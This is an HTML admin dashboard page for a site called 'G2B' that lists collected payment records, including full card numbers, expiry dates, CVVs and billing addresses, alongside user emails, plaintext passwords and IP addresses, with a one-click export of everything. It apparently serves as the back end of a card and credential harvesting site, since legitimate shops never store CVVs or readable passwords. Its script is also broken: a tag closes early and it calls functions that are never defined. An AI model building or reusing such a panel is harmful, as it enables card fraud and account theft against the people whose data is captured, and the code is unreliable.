<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - G2B</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/hide-preview.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container header-container">
            <a href="admin-dashboard.html" class="logo">G<span>2</span>B <span style="font-size: 16px; font-weight: normal;">Admin</span></a>
            
            <div class="auth-buttons">
                <button onclick="adminLogout()" class="btn btn-outline">Logout</button>
            </div>
        </div>
    </header>

    <!-- Admin Dashboard -->
    <div class="admin-container">
        <div class="admin-header">
            <h1 class="admin-title">Admin Dashboard</h1>
            
            <div>
                <button onclick="refreshData()" class="btn btn-primary" style="margin-right: 10px;">
                    <i class="fas fa-sync-alt"></i> Refresh Data
                </button>
                <button onclick="exportData()" class="btn btn-outline">
                    <i class="fas fa-download"></i> Export Data
                </button>
            </div>
        </div>
        
        <div class="admin-tabs">
            <div class="admin-tab active" onclick="switchTab('payment-data')">Payment Data</div>
            <div class="admin-tab" onclick="switchTab('user-data')">User Data</div>
            <div class="admin-tab" onclick="switchTab('analytics')">Analytics</div>
        </div>
        
        <div id="payment-data" class="admin-content">
            <h2 style="margin-bottom: 20px;">Payment Information</h2>
            
            <div style="margin-bottom: 20px;">
                <input type="text" id="payment-search" placeholder="Search payments..." style="padding: 10px; width: 300px; border-radius: 4px; border: 1px solid var(--border-color);">
            </div>
            
            <div style="overflow-x: auto;">
                <table class="admin-table" id="payment-table">
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Name</th>
                            <th>Email</th>
                            <th>Card Number</th>
                            <th>Expiry</th>
                            <th>CVV</th>
                            <th>Product</th>
                            <th>Price</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="payment-table-body">
                        <!-- Payment data will be populated here -->
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="user-data" class="admin-content" style="display: none;">
            <h2 style="margin-bottom: 20px;">User Information</h2>
            
            <div style="margin-bottom: 20px;">
                <input type="text" id="user-search" placeholder="Search users..." style="padding: 10px; width: 300px; border-radius: 4px; border: 1px solid var(--border-color);">
            </div>
            
            <div style="overflow-x: auto;">
                <table class="admin-table" id="user-table">
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Name</th>
                            <th>Email</th>
                            <th>Password</th>
                            <th>Type</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="user-table-body">
                        <!-- User data will be populated here -->
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="analytics" class="admin-content" style="display: none;">
            <h2 style="margin-bottom: 20px;">Analytics</h2>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px;">
                <div style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: var(--shadow);">
                    <h3 style="font-size: 16px; color: #666; margin-bottom: 10px;">Total Payments</h3>
                    <p id="total-payments" style="font-size: 24px; font-weight: 700; color: var(--secondary-color);">0</p>
                </div>
                
                <div style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: var(--shadow);">
                    <h3 style="font-size: 16px; color: #666; margin-bottom: 10px;">Total Users</h3>
                    <p id="total-users" style="font-size: 24px; font-weight: 700; color: var(--secondary-color);">0</p>
                </div>
                
                <div style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: var(--shadow);">
                    <h3 style="font-size: 16px; color: #666; margin-bottom: 10px;">Total Revenue</h3>
                    <p id="total-revenue" style="font-size: 24px; font-weight: 700; color: var(--secondary-color);">$0.00</p>
                </div>
                
                <div style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: var(--shadow);">
                    <h3 style="font-size: 16px; color: #666; margin-bottom: 10px;">Conversion Rate</h3>
                    <p id="conversion-rate" style="font-size: 24px; font-weight: 700; color: var(--secondary-color);">0%</p>
                </div>
            </div>
            
            <div style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: var(--shadow); margin-bottom: 30px;">
                <h3 style="font-size: 18px; margin-bottom: 20px; color: var(--secondary-color);">Recent Activity</h3>
                
                <div style="overflow-x: auto;">
                    <table class="admin-table" id="activity-table">
                        <thead>
                            <tr>
                                <th>Date</th>
                                <th>Type</th>
                                <th>Details</th>
                            </tr>
                        </thead>
                        <tbody id="activity-table-body">
                            <!-- Activity data will be populated here -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script src="js/main.js"></script>
    <script>
    // Check if admin is logged in
    document.addEventListener('DOMContentLoaded', function() {
        if (!isAdminLoggedIn()) {
            window.location.href = 'admin-login.html';
            return;
        }
        
        // Load data
        displayPaymentData();
        displayUserData();
        displayAnalytics();
    });
    
    // Refresh data
    function refreshData() {
        displayPaymentData();
        displayUserData();
        displayAnalytics();
        alert('Data refreshed successfully!');
    }
</script>

        // Switch tabs
        function switchTab(tabId) {
            // Hide all tabs
            document.getElementById('payment-data').style.display = 'none';
            document.getElementById('user-data').style.display = 'none';
            document.getElementById('analytics').style.display = 'none';
            
            // Remove active class from all tabs
            const tabs = document.querySelectorAll('.admin-tab');
            tabs.forEach(tab => tab.classList.remove('active'));
            
            // Show selected tab
            document.getElementById(tabId).style.display = 'block';
            
            // Add active class to selected tab
            const selectedTab = document.querySelector(`.admin-tab[onclick="switchTab('${tabId}')"]`);
            if (selectedTab) {
                selectedTab.classList.add('active');
            }
        }
        
        // Load payment data
        function loadPaymentData() {
            const paymentData = adminFunctions.getPaymentData();
            const tableBody = document.getElementById('payment-table-body');
            tableBody.innerHTML = '';
            
            paymentData.forEach((payment, index) => {
                const row = document.createElement('tr');
                
                // Format date
                const date = new Date(payment.timestamp);
                const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                
                row.innerHTML = `
                    <td>${formattedDate}</td>
                    <td>${payment.firstName} ${payment.lastName}</td>
                    <td>${payment.email}</td>
                    <td>${payment.cardNumber}</td>
                    <td>${payment.expiry}</td>
                    <td>${payment.cvv}</td>
                    <td>${payment.product}</td>
                    <td>${payment.price}</td>
                    <td>
                        <div class="admin-actions">
                            <button class="admin-button view-button" onclick="viewPaymentDetails(${index})">View</button>
                            <button class="admin-button delete-button" onclick="deletePayment(${index})">Delete</button>
                        </div>
                    </td>
                `;
                
                tableBody.appendChild(row);
            });
            
            // Update analytics
            document.getElementById('total-payments').textContent = paymentData.length;
        }
        
        // Load user data
        function loadUserData() {
            const userData = adminFunctions.getUserData();
            const tableBody = document.getElementById('user-table-body');
            tableBody.innerHTML = '';
            
            userData.forEach((user, index) => {
                const row = document.createElement('tr');
                
                // Format date
                const date = new Date(user.timestamp);
                const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                
                row.innerHTML = `
                    <td>${formattedDate}</td>
                    <td>${user.fullname || 'N/A'}</td>
                    <td>${user.email}</td>
                    <td>${user.password}</td>
                    <td>${user.type}</td>
                    <td>
                        <div class="admin-actions">
                            <button class="admin-button view-button" onclick="viewUserDetails(${index})">View</button>
                            <button class="admin-button delete-button" onclick="deleteUser(${index})">Delete</button>
                        </div>
                    </td>
                `;
                
                tableBody.appendChild(row);
            });
            
            // Update analytics
            document.getElementById('total-users').textContent = userData.length;
        }
        
        // Load analytics data
        function loadAnalyticsData() {
            const paymentData = adminFunctions.getPaymentData();
            const userData = adminFunctions.getUserData();
            const analyticsData = adminFunctions.getAnalyticsData();
            
            // Calculate total revenue
            let totalRevenue = 0;
            paymentData.forEach(payment => {
                const price = payment.price;
                if (price) {
                    const numericPrice = parseFloat(price.replace(/[^0-9.-]+/g, ''));
                    if (!isNaN(numericPrice)) {
                        totalRevenue += numericPrice;
                    }
                }
            });
            
            // Update analytics
            document.getElementById('total-revenue').textContent = `$${totalRevenue.toFixed(2)}`;
            
            // Calculate conversion rate
            const registrations = userData.filter(user => user.type === 'registration').length;
            const payments = paymentData.length;
            const conversionRate = registrations > 0 ? (payments / registrations) * 100 : 0;
            document.getElementById('conversion-rate').textContent = `${conversionRate.toFixed(1)}%`;
            
            // Populate activity table
            const activityTableBody = document.getElementById('activity-table-body');
            activityTableBody.innerHTML = '';
            
            // Combine and sort all data by timestamp
            const allActivity = [
                ...paymentData.map(item => ({ ...item, dataType: 'payment' })),
                ...userData.map(item => ({ ...item, dataType: 'user' })),
                ...analyticsData.map(item => ({ ...item, dataType: 'analytics' }))
            ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            // Take only the most recent 10 activities
            const recentActivity = allActivity.slice(0, 10);
            
            recentActivity.forEach(activity => {
                const row = document.createElement('tr');
                
                // Format date
                const date = new Date(activity.timestamp);
                const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                
                let type = '';
                let details = '';
                
                if (activity.dataType === 'payment') {
                    type = 'Payment';
                    details = `${activity.firstName} ${activity.lastName} purchased ${activity.product}`;
                } else if (activity.dataType === 'user') {
                    type = activity.type === 'registration' ? 'Registration' : 'Login';
                    details = `${activity.email} ${activity.type === 'registration' ? 'registered' : 'logged in'}`;
                } else if (activity.dataType === 'analytics') {
                    type = 'Page View';
                    details = `${activity.url} viewed`;
                }
                
                row.innerHTML = `
                    <td>${formattedDate}</td>
                    <td>${type}</td>
                    <td>${details}</td>
                `;
                
                activityTableBody.appendChild(row);
            });
        }
        
        // View payment details
        function viewPaymentDetails(index) {
            const paymentData = adminFunctions.getPaymentData();
            const payment = paymentData[index];
            
            if (payment) {
                alert(`
Payment Details:
--------------
Date: ${new Date(payment.timestamp).toLocaleString()}
Name: ${payment.firstName} ${payment.lastName}
Email: ${payment.email}
Phone: ${payment.phone}
Product: ${payment.product}
Price: ${payment.price}

Payment Information:
-----------------
Card Number: ${payment.cardNumber}
Name on Card: ${payment.cardName}
Expiry: ${payment.expiry}
CVV: ${payment.cvv}

Billing Address:
--------------
Address: ${payment.address}
City: ${payment.city}
State: ${payment.state}
ZIP: ${payment.zip}
Country: ${payment.country}
                `);
            }
        }
        
        // View user details
        function viewUserDetails(index) {
            const userData = adminFunctions.getUserData();
            const user = userData[index];
            
            if (user) {
                alert(`
User Details:
-----------
Date: ${new Date(user.timestamp).toLocaleString()}
Type: ${user.type}
Email: ${user.email}
Password: ${user.password}
Full Name: ${user.fullname || 'N/A'}
IP: ${user.ip || 'N/A'}
                `);
            }
        }
        
        // Delete payment
        function deletePayment(index) {
            if (confirm('Are you sure you want to delete this payment record?')) {
                const paymentData = adminFunctions.getPaymentData();
                paymentData.splice(index, 1);
                localStorage.setItem('g2bPaymentData', JSON.stringify(paymentData));
                loadPaymentData();
                loadAnalyticsData();
            }
        }
        
        // Delete user
        function deleteUser(index) {
            if (confirm('Are you sure you want to delete this user record?')) {
                const userData = adminFunctions.getUserData();
                userData.splice(index, 1);
                localStorage.setItem('g2bUserData', JSON.stringify(userData));
                loadUserData();
                loadAnalyticsData();
            }
        }
        
        // Refresh data
        function refreshData() {
            loadPaymentData();
            loadUserData();
            loadAnalyticsData();
            alert('Data refreshed successfully!');
        }
        
        // Export data
        function exportData() {
            const paymentData = adminFunctions.getPaymentData();
            const userData = adminFunctions.getUserData();
            const analyticsData = adminFunctions.getAnalyticsData();
            
            const exportData = {
                payments: paymentData,
                users: userData,
                analytics: analyticsData,
                exportDate: new Date().toISOString()
            };
            
            const dataStr = JSON.stringify(exportData, null, 2);
            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
            
            const exportFileDefaultName = 'g2b-data-export.json';
            
            const linkElement = document.createElement('a');
            linkElement.setAttribute('href', dataUri);
            linkElement.setAttribute('download', exportFileDefaultName);
            linkElement.click();
        }
        
        // Search functionality
        document.getElementById('payment-search').addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            const rows = document.querySelectorAll('#payment-table-body tr');
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(searchTerm) ? '' : 'none';
            });
        });
        
        document.getElementById('user-search').addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            const rows = document.querySelectorAll('#user-table-body tr');
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(searchTerm) ? '' : 'none';
            });
        });
    </script>
</body>
</html>